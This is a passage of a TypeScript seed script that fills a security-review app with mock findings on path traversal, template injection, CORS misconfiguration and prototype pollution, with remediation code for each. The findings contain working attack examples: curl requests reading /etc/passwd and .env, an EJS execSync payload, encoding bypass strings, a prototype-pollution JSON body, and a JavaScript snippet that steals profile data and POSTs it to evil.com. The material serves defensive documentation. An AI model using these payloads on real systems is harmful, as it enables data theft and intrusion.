        description: "The report generation endpoint constructs template paths using unsanitized user input:\n\n```typescript\n// src/routes/reports.ts:45\napp.get('/api/reports/generate', async (req, res) => {\n  const { template, format } = req.query;\n  const templatePath = path.join('./templates/reports', template);\n  const content = await fs.readFile(templatePath, 'utf-8');\n  const rendered = await renderTemplate(content, req.user.data);\n  res.send(rendered);\n});\n```\n\n**Proof of concept:**\n```bash\n# Read /etc/passwd\ncurl 'https://app.example.com/api/reports/generate?template=../../../etc/passwd'\n\n# Read application environment variables\ncurl 'https://app.example.com/api/reports/generate?template=../../../.env'\n\n# Read source code\ncurl 'https://app.example.com/api/reports/generate?template=../../src/config/database.ts'\n```\n\n`path.join()` resolves `../` sequences, so `path.join('./templates/reports', '../../../etc/passwd')` evaluates to `/etc/passwd`. The file is then read and its contents are rendered (and returned) as a template.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Template rendering of arbitrary files enables SSTI",
        description: "The `renderTemplate()` function processes the file content through the EJS template engine, meaning any file read via traversal is also **executed** as a template:\n\n```typescript\n// If an attacker can control file content (e.g., via upload + traversal):\n// Template: <%- global.process.mainModule.require('child_process').execSync('id') %>\n```\n\nWhile reading existing system files is limited to information disclosure, if an attacker combines this with the file upload vulnerability (PAGE-012), they can:\n1. Upload a file containing EJS template injection payload\n2. Use path traversal to render that uploaded file as a template\n3. Achieve Remote Code Execution through template injection\n\nEven without upload access, some system files or log files may contain user-controlled content that could be interpreted as template syntax.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement path canonicalization and template allowlist",
        description: "The template loading mechanism must prevent directory traversal:\n\n**Option 1 — Path canonicalization check:**\n```typescript\nconst TEMPLATE_DIR = path.resolve('./templates/reports');\nconst requestedPath = path.resolve(TEMPLATE_DIR, template);\n\n// Verify resolved path is still within template directory\nif (!requestedPath.startsWith(TEMPLATE_DIR + path.sep)) {\n  return res.status(403).json({ error: 'Invalid template path' });\n}\n```\n\n**Option 2 — Template allowlist (preferred):**\n```typescript\nconst ALLOWED_TEMPLATES = ['monthly-summary', 'security-report', 'compliance-audit', 'executive-brief'];\nif (!ALLOWED_TEMPLATES.includes(template)) {\n  return res.status(400).json({ error: 'Unknown template', available: ALLOWED_TEMPLATES });\n}\nconst templatePath = path.join(TEMPLATE_DIR, `${template}.ejs`);\n```\n\n**Option 3 — Database-stored templates:**\nStore templates in the database instead of the filesystem, eliminating path traversal entirely. Templates are loaded by ID, and the filesystem is never accessed with user input.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "URL encoding and null byte variants bypass basic string filtering",
        description: "If a basic string filter is applied (e.g., rejecting strings containing `..`), multiple bypass techniques exist:\n\n- **URL encoding:** `%2e%2e%2f` → `../`\n- **Double encoding:** `%252e%252e%252f` → `%2e%2e%2f` → `../`\n- **Null byte (legacy):** `template=../../../etc/passwd%00.ejs`\n- **Unicode normalization:** `..%c0%af` (overlong UTF-8 for `/`)\n- **Backslash on Windows:** `..\\..\\..\\windows\\system32\\config\\sam`\n\nString-based filtering (`template.includes('..')`) is insufficient. Only path canonicalization (resolving the full path and comparing prefixes) or allowlisting prevents all bypass variants.\n\nThe application should use `path.resolve()` + prefix check rather than any form of input sanitization.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "DEFERRED",
      },
    ],
  },

  // ─── Review 19 ──────────────────────────────────────────────────────────────
  {
    title: "CORS misconfiguration allows credential theft",
    summary: "The application's CORS (Cross-Origin Resource Sharing) configuration dynamically reflects the `Origin` request header in the `Access-Control-Allow-Origin` response header while also setting `Access-Control-Allow-Credentials: true`. This means any website on the internet can make authenticated cross-origin requests to the API and read the responses, effectively bypassing the Same-Origin Policy.\n\n**Impact:** Complete account takeover from any malicious website:\n\n- Read authenticated API responses (user data, settings, tokens)\n- Perform state-changing actions with the victim's session\n- Exfiltrate sensitive data from protected endpoints\n- Chain with other vulnerabilities for full compromise\n- Affect all users who visit a malicious or compromised website",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "LINEAR",
    externalId: "LOO-029",
    findings: [
      {
        type: "THREAT",
        title: "Origin reflection with credentials enables cross-origin data theft",
        description: "The CORS middleware dynamically reflects any origin:\n\n```typescript\n// src/middleware/cors.ts:8\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  res.setHeader('Access-Control-Allow-Origin', origin || '*');\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');\n  next();\n});\n```\n\n**Exploitation from attacker's website:**\n```javascript\n// Hosted on https://evil.com\nfetch('https://app.example.com/api/account/profile', {\n  credentials: 'include' // Sends victim's session cookie\n})\n.then(r => r.json())\n.then(data => {\n  // Successfully reads response — CORS allows it!\n  fetch('https://evil.com/exfil', {\n    method: 'POST',\n    body: JSON.stringify(data) // Send stolen data to attacker\n  });\n});\n```\n\nThis bypasses SameSite=Lax cookies because the request is a simple GET (no preflight needed), and the response is readable because CORS allows it.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Preflight bypass for simple requests enables silent exploitation",
        description: "CORS preflight (OPTIONS) is only triggered for \"non-simple\" requests. Simple requests (GET, HEAD, POST with certain content types) are sent immediately with cookies, and the browser only checks CORS headers **after** the response arrives.\n\nThis means:\n1. `GET /api/account/profile` — no preflight, response readable\n2. `GET /api/settings/api-keys` — no preflight, API keys exposed\n3. `POST /api/account/email` with `Content-Type: text/plain` — no preflight, action performed\n\nThe attacker doesn't need to trigger a preflight request to exploit this. Any simple GET request to an authenticated endpoint will return data that the attacker can read.\n\n**Data accessible without preflight:**\n- User profile (name, email, phone)\n- API keys and integration tokens\n- Project configurations\n- Team member lists\n- Billing information",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement strict CORS origin allowlist",
        description: "Replace the origin-reflecting CORS configuration with a strict allowlist:\n\n```typescript\nconst ALLOWED_ORIGINS = new Set([\n  'https://app.example.com',\n  'https://admin.example.com',\n  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000', 'http://localhost:5173'] : []),\n]);\n\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (origin && ALLOWED_ORIGINS.has(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n    res.setHeader('Access-Control-Allow-Credentials', 'true');\n  }\n  // If origin not in allowlist: no CORS headers = browser blocks response\n  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With');\n  if (req.method === 'OPTIONS') return res.sendStatus(204);\n  next();\n});\n```\n\n**Critical rules:**\n- NEVER reflect the `Origin` header directly\n- NEVER use `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` (browsers reject this, but the current code falls back to the specific origin)\n- Always validate against a strict set of known-good origins\n- Consider `Vary: Origin` header for proper caching behavior",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 20 ──────────────────────────────────────────────────────────────
  {
    title: "Prototype pollution in request body processing",
    summary: "The application uses a custom deep-merge utility function to combine request body data with default configuration objects. This utility does not guard against `__proto__`, `constructor`, or `prototype` properties in the input, allowing an attacker to pollute the Object prototype via crafted JSON payloads. Prototype pollution can lead to property injection across all objects in the application, potentially enabling authentication bypass, privilege escalation, or Remote Code Execution depending on how polluted properties are consumed.\n\n**Impact:** Application-wide object manipulation:\n\n- Inject properties into all JavaScript objects in the process\n- Bypass authentication checks that use `hasOwnProperty` improperly\n- Trigger RCE in template engines or child_process calls that read from polluted objects\n- Cause denial of service by polluting critical object methods\n- Escalate privileges by injecting `isAdmin: true` into user objects",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "NOTION",
    externalId: "PAGE-016",
    findings: [
      {
        type: "THREAT",
        title: "Deep merge utility vulnerable to __proto__ pollution",
        description: "The custom `deepMerge()` utility in `src/lib/utils.ts` recursively copies properties without checking for prototype-polluting keys:\n\n```typescript\n// src/lib/utils.ts:156\nfunction deepMerge(target: any, source: any): any {\n  for (const key in source) {\n    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {\n      target[key] = deepMerge(target[key] || {}, source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}\n```\n\n**Exploitation:**\n```bash\ncurl -X POST https://app.example.com/api/settings/update \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"isAdmin\": true, \"role\": \"super_admin\"}}'\n```\n\nAfter this request, **every object** in the Node.js process will have `isAdmin === true` when accessed:\n```javascript\nconst obj = {};\nconsole.log(obj.isAdmin); // true — polluted!\n```\n\nThis persists for the lifetime of the process and affects all subsequent requests from all users.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Prototype pollution enables authentication bypass via property injection",
        description: "Several authentication checks in the application are vulnerable to prototype pollution because they check for property existence without using `hasOwnProperty()`:\n\n```typescript\n// src/middleware/auth.ts:34\nfunction checkPermission(user: any, permission: string): boolean {\n  return user.permissions && user.permissions[permission];\n}\n\n// If Object.prototype is polluted with:\n// Object.prototype.permissions = { admin: true, delete: true }\n// Then ALL users pass ALL permission checks!\n```\n\nAdditional vulnerable patterns:\n```typescript\n// src/routes/admin.ts:12\nif (req.user.isAdmin) { /* grant admin access */ }\n// Polluting Object.prototype.isAdmin = true grants everyone admin\n\n// src/middleware/rateLimit.ts:8\nif (req.user.exempt) { /* skip rate limiting */ }\n// Polluting Object.prototype.exempt = true disables rate limiting\n```\n\nThe combination of prototype pollution + loose property checking creates multiple authentication/authorization bypass paths.",
        severity: "HIGH",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Secure the deep merge utility and add prototype pollution guards",
        description: "Multiple fixes are needed to prevent and mitigate prototype pollution:\n\n**1. Fix deepMerge() to reject dangerous keys:**\n```typescript\nconst DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);\n\nfunction deepMerge(target: any, source: any): any {\n  for (const key in source) {\n    if (DANGEROUS_KEYS.has(key)) continue; // Skip pollution vectors\n    if (!Object.prototype.hasOwnProperty.call(source, key)) continue;\n    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {\n      target[key] = deepMerge(target[key] || Object.create(null), source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}\n```\n\n**2. Use `Object.create(null)` for lookup maps:**\nReplace `{}` with `Object.create(null)` for objects used as dictionaries to prevent prototype chain access.\n\n**3. Add JSON schema validation** (via Zod) that strips unknown properties before deep merge.\n\n**4. Consider `Object.freeze(Object.prototype)`** in application entry point as defense-in-depth (test for compatibility first).\n\n**5. Replace custom deepMerge** with a battle-tested library like `lodash.merge` with `customizer` that rejects dangerous keys.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "Multiple code paths consume potentially polluted properties",
        description: "Audit identified 14 locations where properties are read from objects without `hasOwnProperty()` checks, making them exploitable via prototype pollution:\n\n**Authentication/Authorization (5):**\n- `src/middleware/auth.ts:34` — `user.permissions[permission]`\n- `src/middleware/auth.ts:51` — `user.isAdmin`\n- `src/routes/admin.ts:12` — `req.user.isAdmin`\n- `src/middleware/rateLimit.ts:8` — `req.user.exempt`\n- `src/controllers/team.ts:67` — `member.role`\n\n**Configuration (4):**\n- `src/config/index.ts:23` — `config.features[featureName]`\n- `src/config/index.ts:45` — `config.limits.maxUploadSize`\n- `src/lib/email.ts:12` — `options.template`\n- `src/lib/queue.ts:34` — `jobConfig.priority`\n\n**Business Logic (5):**\n- `src/services/billing.ts:89` — `plan.features[feature]`\n- `src/services/export.ts:23` — `format.options.delimiter`\n- `src/controllers/projects.ts:45` — `project.settings.public`\n- `src/controllers/reviews.ts:67` — `review.metadata.autoApprove`\n- `src/lib/notifications.ts:12` — `prefs.channels[channel]`\n\nEach of these can be exploited by polluting the Object prototype with the accessed property name.",
        severity: "MEDIUM",
        strideCategory: "TAMPERING",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
    ],
  },
];

// ─── Main Seed Function ─────────────────────────────────────────────────────

async function main() {
  console.log("Seeding review data...\n");

  const tenant = await db.tenant.upsert({
    where: { workosOrgId: WORKOS_ORG_ID },
    update: {},
    create: { name: TENANT_NAME, workosOrgId: WORKOS_ORG_ID },
  });
  console.log(`Tenant: ${tenant.id} (${tenant.name})`);

  const integration = await db.integration.upsert({
    where: { tenantId_provider: { tenantId: tenant.id, provider: "LINEAR" } },
    update: {},
    create: { tenantId: tenant.id, provider: "LINEAR", status: "ACTIVE", externalId: "linear_workspace_seed" },
  });
  const notionIntegration = await db.integration.upsert({
    where: { tenantId_provider: { tenantId: tenant.id, provider: "NOTION" } },
    update: {},
    create: { tenantId: tenant.id, provider: "NOTION", status: "ACTIVE", externalId: "notion_workspace_seed" },
  });
  console.log(`Integrations: LINEAR (${integration.id}), NOTION (${notionIntegration.id})`);

  const integrations = { LINEAR: integration, NOTION: notionIntegration };

  const projects = await db.project.findMany({
    where: { tenantId: tenant.id },
    select: { id: true },
  });
  if (projects.length === 0) {
    console.error("No projects found! Run seed-projects.ts first.");
    process.exit(1);
  }
  console.log(`Found ${projects.length} projects\n`);

  await db.finding.deleteMany({ where: { review: { tenantId: tenant.id } } });
  await db.review.deleteMany({ where: { tenantId: tenant.id } });
  await db.contextBundle.deleteMany({ where: { tenantId: tenant.id } });
  await db.event.deleteMany({ where: { tenantId: tenant.id } });
  console.log("Cleared existing seed data\n");

  const baseDate = new Date();
  let createdBundles = 0;
  let createdReviews = 0;
  let createdFindings = 0;

  for (let i = 0; i < REVIEWS.length; i++) {
    const r = REVIEWS[i];
    const eventDate = new Date(baseDate.getTime() - i * 3 * 3_600_000);
    const projectId = projects[i % projects.length].id;

    const event = await db.event.create({
      data: {
        tenantId: tenant.id,
        integrationId: integrations[r.source].id,
        source: r.source,
        externalId: r.externalId,
        type: "issue.created",
        status: "COMPLETED",
        payload: { title: r.title, description: r.summary },
        processedAt: eventDate,
        createdAt: eventDate,
      },
    });

    const bundle = await db.contextBundle.create({
      data: {
        tenantId: tenant.id,
        eventId: event.id,
        projectId,
        status: r.bundleStatus,
        riskLevel: r.riskLevel,
        title: r.title,
        summary: r.summary,
        content: { source: r.source.toLowerCase(), issueKey: r.externalId, description: r.summary },
        createdAt: eventDate,
      },
    });
    createdBundles++;

    const review = await db.review.create({
      data: {
        tenantId: tenant.id,
        contextBundleId: bundle.id,
        status: r.reviewStatus as any,
        mode: "AUTOMATED",
        severity: r.riskLevel === "INFO" ? "LOW" : (r.riskLevel as any),
        confidence: 0.75 + Math.random() * 0.2,
        summary: r.summary,
        modelUsed: "amazon.nova-pro-v1:0",
        createdAt: eventDate,
      },
    });
    createdReviews++;

    for (const f of r.findings) {
      await db.finding.create({
        data: {
          reviewId: review.id,
          type: f.type,
          title: f.title,
          description: f.description,
          severity: f.severity,
          confidence: 0.7 + Math.random() * 0.25,
          strideCategory: f.strideCategory,
          effortEstimate: f.effortEstimate,
          status: f.status,
          createdAt: eventDate,
        },
      });
      createdFindings++;
    }
  }

  console.log(`\nSeeding complete:`);
  console.log(`  Context Bundles: ${createdBundles}`);
  console.log(`  Reviews: ${createdReviews}`);
  console.log(`  Findings: ${createdFindings}`);

  const bundleCount = await db.contextBundle.count({ where: { tenantId: tenant.id } });
  const reviewCount = await db.review.count({ where: { tenantId: tenant.id } });
  const findingCount = await db.finding.count();
  console.log(`\nVerification: ${bundleCount} bundles, ${reviewCount} reviews, ${findingCount} findings in DB`);
}

main()
  .then(() => { process.exit(0); })
  .catch((e) => { console.error("Seed failed:", e); process.exit(1); });
